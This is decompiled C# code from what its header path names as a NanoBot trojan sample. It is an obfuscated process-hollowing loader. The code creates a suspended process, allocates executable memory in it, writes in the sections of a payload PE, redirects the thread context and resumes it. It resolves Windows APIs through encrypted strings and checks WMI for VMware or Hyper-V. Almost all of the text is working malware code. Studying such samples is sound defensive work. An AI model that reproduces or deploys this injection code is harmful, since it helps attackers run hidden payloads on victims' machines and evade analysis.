// Decompiled with JetBrains decompiler
// Type: FromBase64CharArray
// Assembly: eaalrcmrfI, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C355521D-A8D3-4BFF-826A-B700AE05DFBA
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.NanoBot.gen-b5c0fbacf138110997b42458b91da53ffa1e40035048aa0b00fc64315b7b83de.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

public static class FromBase64CharArray
{
  private static FromBase64CharArray.ValidateNewNode Get_Last = FromBase64CharArray.\u003CbaseDir\u003E5__7<FromBase64CharArray.ValidateNewNode>(\u003CModule\u003E.ÚO\u001326("SeWAslzm6q3OLWxjsF/VAA==", "eaalrcmrfI"), \u003CModule\u003E.ÚO\u001326("FI+F77XGTTF0w/gtsbT/NWhRM+KUTnyM", "eaalrcmrfI"));
  private static FromBase64CharArray.Modules EncoderReplacementFallback = FromBase64CharArray.\u003CbaseDir\u003E5__7<FromBase64CharArray.Modules>(\u003CModule\u003E.ÚO\u001326("SeWAslzm6q3OLWxjsF/VAA==", "eaalrcmrfI"), \u003CModule\u003E.ÚO\u001326("l0dji7DI24xiIQ8EQPAXmjwu7ioPjfgy", "eaalrcmrfI"));
  private static FromBase64CharArray.get_IsCancellationRequested NativeRegisterStack = FromBase64CharArray.\u003CbaseDir\u003E5__7<FromBase64CharArray.get_IsCancellationRequested>(\u003CModule\u003E.ÚO\u001326("SeWAslzm6q3OLWxjsF/VAA==", "eaalrcmrfI"), \u003CModule\u003E.ÚO\u001326("PIlisnpdIgVGz02DWCERALiOCm0+sE3v", "eaalrcmrfI"));
  private static FromBase64CharArray.Pinned _isCompleted = FromBase64CharArray.\u003CbaseDir\u003E5__7<FromBase64CharArray.Pinned>(\u003CModule\u003E.ÚO\u001326("SeWAslzm6q3OLWxjsF/VAA==", "eaalrcmrfI"), \u003CModule\u003E.ÚO\u001326("1saBwV8DwW5G/WuzKl/p/A==", "eaalrcmrfI"));
  private static FromBase64CharArray.QueueUserWorkItemCallback IsSimpleType = FromBase64CharArray.\u003CbaseDir\u003E5__7<FromBase64CharArray.QueueUserWorkItemCallback>(\u003CModule\u003E.ÚO\u001326("SeWAslzm6q3OLWxjsF/VAA==", "eaalrcmrfI"), \u003CModule\u003E.ÚO\u001326("Vjsa3Z0tzsWT9s90Ipuyctlk+ZZHSL9F", "eaalrcmrfI"));
  private static FromBase64CharArray._thread CheckOpenSubKeyPermission = FromBase64CharArray.\u003CbaseDir\u003E5__7<FromBase64CharArray._thread>(\u003CModule\u003E.ÚO\u001326("SeWAslzm6q3OLWxjsF/VAA==", "eaalrcmrfI"), \u003CModule\u003E.ÚO\u001326("+tN1EqmcgpaptjzUfhLDlooMpACK25QW", "eaalrcmrfI"));
  private static FromBase64CharArray.TriggerFailure RightChar = FromBase64CharArray.\u003CbaseDir\u003E5__7<FromBase64CharArray.TriggerFailure>(\u003CModule\u003E.ÚO\u001326("SeWAslzm6q3OLWxjsF/VAA==", "eaalrcmrfI"), \u003CModule\u003E.ÚO\u001326("oMVkBkyXuiffaOm2vWWCmU+9iTt0OROc", "eaalrcmrfI"));
  private static FromBase64CharArray.GetApproxDeclaringType HasSameRules = FromBase64CharArray.\u003CbaseDir\u003E5__7<FromBase64CharArray.GetApproxDeclaringType>(\u003CModule\u003E.ÚO\u001326("SeWAslzm6q3OLWxjsF/VAA==", "eaalrcmrfI"), \u003CModule\u003E.ÚO\u001326("XhjD6lPQ2IEWHnTqLH+3QQ==", "eaalrcmrfI"));
  private static FromBase64CharArray.SystemRuntimeRemoting Set_ProcessorArchitecture = FromBase64CharArray.\u003CbaseDir\u003E5__7<FromBase64CharArray.SystemRuntimeRemoting>(\u003CModule\u003E.ÚO\u001326("+wdHdJ475ynNu5ClSGLQyA==", "eaalrcmrfI"), \u003CModule\u003E.ÚO\u001326("SA5knM/Pxh2DtiM17ZiNz9+VQMxLBqql", "eaalrcmrfI"));

  public static \u0001 \u003CbaseDir\u003E5__7<\u0001>(string _param0_1, string _param1)
  {
    AssemblyBuilder assemblyBuilder = (AssemblyBuilder) \u003CModule\u003E.\u0008\u00B0ahË(\u003CModule\u003E.\u0080ëÁ\u000Bl(), \u003CModule\u003E.y\u000Dª\u00A8\u005D(\u003CModule\u003E.ÚO\u001326("p8uJePmIy8swNvjF3g2Kb+80K1c6dMyq", "eaalrcmrfI")), AssemblyBuilderAccess.Run);
    ModuleBuilder moduleBuilder = (ModuleBuilder) \u003CModule\u003E.wº1è\u0080((object) assemblyBuilder, \u003CModule\u003E.ÚO\u001326("p8uJePmIy8slpy//ydBryB/3luApF826", "eaalrcmrfI"));
    TypeBuilder typeBuilder = (TypeBuilder) \u003CModule\u003E.\u0009\u0084\u00816z((object) moduleBuilder, "DynamicDllInvokeType", TypeAttributes.Public | TypeAttributes.UnicodeClass);
    // ISSUE: type reference
    MethodInfo methodInfo1 = (MethodInfo) \u003CModule\u003E.\u0085KªX\u00B4(\u003CModule\u003E.ô\u00BEÑ\u0014\u002C(__typeref (\u0001)), \u003CModule\u003E.ÚO\u001326("ZWcpvpjAag8=", "eaalrcmrfI"));
    Type[] array = ((IEnumerable<ParameterInfo>) \u003CModule\u003E.\u0009É\u007Bi\u0090((object) methodInfo1)).Select<ParameterInfo, Type>((Func<ParameterInfo, Type>) (_param0_2 => (Type) \u003CModule\u003E.Åá\u005CµÛ((object) _param0_2))).ToArray<Type>();
    MethodBuilder methodBuilder = (MethodBuilder) \u003CModule\u003E.\u002E4gU\u0094((object) typeBuilder, _param1, _param0_1, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, CallingConventions.Standard, \u003CModule\u003E.þò\u0008\u0096\u003C((object) methodInfo1), array, CallingConvention.Winapi, CharSet.Ansi);
    \u003CModule\u003E.uÙjë\u00AB((object) methodBuilder, \u003CModule\u003E.\u005BiÚ\u0088ü((object) methodBuilder) | MethodImplAttributes.PreserveSig);
    Type type = (Type) \u003CModule\u003E.\u00A8\u005E\u00A5Bk((object) typeBuilder);
    MethodInfo methodInfo2 = (MethodInfo) \u003CModule\u003E.ÛºÐ\u008Dð((object) type, _param1);
    // ISSUE: type reference
    return (\u0001) \u003CModule\u003E.w2Âª\u0009((Type) \u003CModule\u003E.ô\u00BEÑ\u0014\u002C(__typeref (\u0001)), methodInfo2, true);
  }

  public static bool SixteenBits(string _param0, string _param1, byte[] _param2, bool _param3)
  {
    for (int index = 1; index <= 5; ++index)
    {
      if (\u003CModule\u003E.\u003B\u0019ª3\u009B(_param0, _param1, _param2, _param3))
        return true;
    }
    return false;
  }

  public static bool Get_PointerToRawData(
    string _param0,
    string _param1,
    byte[] _param2,
    bool _param3)
  {
    int lpNumberOfBytesWritten = 0;
    string lpCommandLine = \u003CModule\u003E.\u0017\u003D\u00B8\u0015h("\"", _param0, "\"");
    FromBase64CharArray.CloseMethod startupInfo = new FromBase64CharArray.CloseMethod();
    FromBase64CharArray.GetLocals dednkoASSar = new FromBase64CharArray.GetLocals();
    // ISSUE: type reference
    startupInfo.Set_Offset = \u003CModule\u003E.Ô1fÆt(\u003CModule\u003E.ô_\u0011\u00A0Ì((Type) \u003CModule\u003E.ô\u00BEÑ\u0014\u002C(__typeref (FromBase64CharArray.CloseMethod))));
    try
    {
      if (!\u003CModule\u003E.\u0034\u002A\u009F\u00AC\u009A(_param1))
        lpCommandLine = \u003CModule\u003E.\u0017\u003D\u00B8\u0015h(lpCommandLine, " ", _param1);
      if (!FromBase64CharArray.Set_ProcessorArchitecture(IntPtr.Zero, _param0, lpCommandLine, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, (string) null, ref startupInfo, ref dednkoASSar))
        throw \u003CModule\u003E.B\u001FË\u0022ÿ();
      int num1 = \u003CModule\u003E.\u008B\u005E\u0018\u008CY(_param2, 60);
      int num2 = \u003CModule\u003E.\u008B\u005E\u0018\u008CY(_param2, num1 + 52);
      int[] context = new int[179];
      context[0] = 65538;
      if (\u003CModule\u003E.\u00A0\u008DáÙ\u0001() != 4)
      {
        int num3 = FromBase64CharArray.Get_Last(dednkoASSar.M_ManagedThreadId, context) ? 1 : 0;
      }
      else
      {
        int num4 = FromBase64CharArray.EncoderReplacementFallback(dednkoASSar.M_ManagedThreadId, context) ? 1 : 0;
      }
      int num5 = context[41];
      int lpBuffer1 = 0;
      int num6 = FromBase64CharArray.NativeRegisterStack(dednkoASSar.AddMonthNames, num5 + 8, lpBuffer1, 4, ref lpNumberOfBytesWritten) ? 1 : 0;
      int dwSize = \u003CModule\u003E.\u008B\u005E\u0018\u008CY(_param2, num1 + 80);
      int nSize = \u003CModule\u003E.\u008B\u005E\u0018\u008CY(_param2, num1 + 84);
      bool flag = false;
      int lpBaseAddress = FromBase64CharArray._isCompleted(dednkoASSar.AddMonthNames, \u003CModule\u003E.\u008AÜusò(num2), (uint) dwSize, 12288U, 64U);
      if (!_param3 && lpBaseAddress == 0)
      {
        flag = true;
        lpBaseAddress = FromBase64CharArray._isCompleted(dednkoASSar.AddMonthNames, \u003CModule\u003E.\u008AÜusò(0), (uint) dwSize, 12288U, 64U);
      }
      if (lpBaseAddress == 0)
        throw \u003CModule\u003E.B\u001FË\u0022ÿ();
      int num7 = FromBase64CharArray.IsSimpleType(dednkoASSar.AddMonthNames, lpBaseAddress, _param2, nSize, out lpNumberOfBytesWritten) ? 1 : 0;
      int num8 = num1 + 248;
      short num9 = \u003CModule\u003E.A\u003B6úÈ(_param2, num1 + 6);
      int num10 = 0;
      do
      {
        int num11 = \u003CModule\u003E.\u008B\u005E\u0018\u008CY(_param2, num8 + 12);
        int length = \u003CModule\u003E.\u008B\u005E\u0018\u008CY(_param2, num8 + 16);
        int num12 = \u003CModule\u003E.\u008B\u005E\u0018\u008CY(_param2, num8 + 20);
        if (length != 0)
        {
          byte[] lpBuffer2 = new byte[length];
          \u003CModule\u003E.Sµãø\u0082((Array) _param2, num12, (Array) lpBuffer2, 0, lpBuffer2.Length);
          int num13 = FromBase64CharArray.IsSimpleType(dednkoASSar.AddMonthNames, lpBaseAddress + num11, lpBuffer2, lpBuffer2.Length, out lpNumberOfBytesWritten) ? 1 : 0;
        }
        num8 += 40;
        ++num10;
      }
      while (num10 <= (int) num9 - 1);
      byte[] lpBuffer3 = \u003CModule\u003E.\u002Aø\u00AB\u009Ep(lpBaseAddress);
      int num14 = FromBase64CharArray.IsSimpleType(dednkoASSar.AddMonthNames, num5 + 8, lpBuffer3, 4, out lpNumberOfBytesWritten) ? 1 : 0;
      int num15 = \u003CModule\u003E.\u008B\u005E\u0018\u008CY(_param2, num1 + 40);
      if (flag)
        lpBaseAddress = num2;
      context[44] = lpBaseAddress + num15;
      \u003CModule\u003E.Q\u001E\u00B7D\u0026(500);
      if (\u003CModule\u003E.\u00A0\u008DáÙ\u0001() != 4)
      {
        int num16 = FromBase64CharArray.CheckOpenSubKeyPermission(dednkoASSar.M_ManagedThreadId, context) ? 1 : 0;
      }
      else
      {
        int num17 = FromBase64CharArray.RightChar(dednkoASSar.M_ManagedThreadId, context) ? 1 : 0;
      }
      int num18 = (int) FromBase64CharArray.HasSameRules(dednkoASSar.M_ManagedThreadId);
      ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator = (ManagementObjectCollection.ManagementObjectEnumerator) \u003CModule\u003E.b\u00D7\u0099Ñª(\u003CModule\u003E.ùÙTÓ\u009A(\u003CModule\u003E.\u0032\u008Fïa\u009C("Select * from Win32_ComputerSystem")));
      try
      {
        while (\u003CModule\u003E.\u0086E\u009EJß((object) objectEnumerator))
        {
          ManagementBaseObject managementBaseObject = (ManagementBaseObject) \u003CModule\u003E.\u007D\u008EK\u00ACº((object) objectEnumerator);
          string str = \u003CModule\u003E.\u00BE\u008B\u000FÒS((object) \u003CModule\u003E.\u003B5\u007E\u009Bü(\u003CModule\u003E.ØcßwL((object) managementBaseObject, "Manufacturer")));
          if (!\u003CModule\u003E.é\u000A\u00B2\u003Bé((object) str, "microsoft corporation"))
          {
            int num19 = \u003CModule\u003E.é\u000A\u00B2\u003Bé((object) str, "vmware") ? 1 : 0;
          }
        }
      }
      finally
      {
        if (objectEnumerator != null)
          \u003CModule\u003E.\u0033\u002CÛ\u00BCZ((object) objectEnumerator);
      }
      return true;
    }
    catch (Exception ex)
    {
      \u003CModule\u003E.\u0090\u003C\u0026öì(\u003CModule\u003E.\u003B5\u007E\u009Bü((object) ex));
      \u003CModule\u003E.Dðýàú(\u003CModule\u003E.\u00BFV\u0004Eü(\u003CModule\u003E.\u0012\u009D\u005E5\u0092(dednkoASSar.Seek)));
      return false;
    }
  }

  public delegate void IsArray();

  public delegate double Ldelem_I4(int p, byte b, short s);

  public delegate void ToUpperInvariant();

  public delegate double FoundDatePattern(int p, byte b, short s);

  public delegate bool ValidateNewNode(IntPtr thread, int[] context);

  public delegate bool Modules(IntPtr thread, int[] context);

  public delegate bool get_IsCancellationRequested(
    IntPtr hProcess,
    int lpBaseAddress,
    int lpBuffer,
    int dwSize,
    ref int lpNumberOfBytesRead);

  public delegate int Pinned(
    IntPtr hProcess,
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect);

  public delegate bool QueueUserWorkItemCallback(
    IntPtr hProcess,
    int lpBaseAddress,
    byte[] lpBuffer,
    int nSize,
    out int lpNumberOfBytesWritten);

  public delegate bool _thread(IntPtr thread, int[] context);

  public delegate bool TriggerFailure(IntPtr thread, int[] context);

  public delegate uint GetApproxDeclaringType(IntPtr hThread);

  public delegate bool SystemRuntimeRemoting(
    IntPtr hToken,
    string lpApplicationName,
    string lpCommandLine,
    IntPtr lpProcessAttributes,
    IntPtr lpThreadAttributes,
    bool bInheritHandles,
    uint dwCreationFlags,
    IntPtr lpEnvironment,
    string lpCurrentDirectory,
    ref FromBase64CharArray.CloseMethod startupInfo,
    ref FromBase64CharArray.GetLocals dednkoASSar);

  public struct GetLocals
  {
    public readonly IntPtr AddMonthNames;
    public readonly IntPtr M_ManagedThreadId;
    public readonly uint Seek;
    private readonly uint GetMonthDayOrder;
  }

  public struct CloseMethod
  {
    public uint Set_Offset;
    private readonly string IsAccountingInfoValid;
    private readonly string AutoReset;
    private readonly string RESOURCE_STRING_ALIGNMENT;
    private readonly byte[] GetOwnerOfParam;
    private readonly IntPtr \u003C\u003Ec__DisplayClass30_0;
    private readonly IntPtr Set_StringFormat;
    private readonly IntPtr NumDefMDs;
    private readonly IntPtr AsyncResult;
  }
}
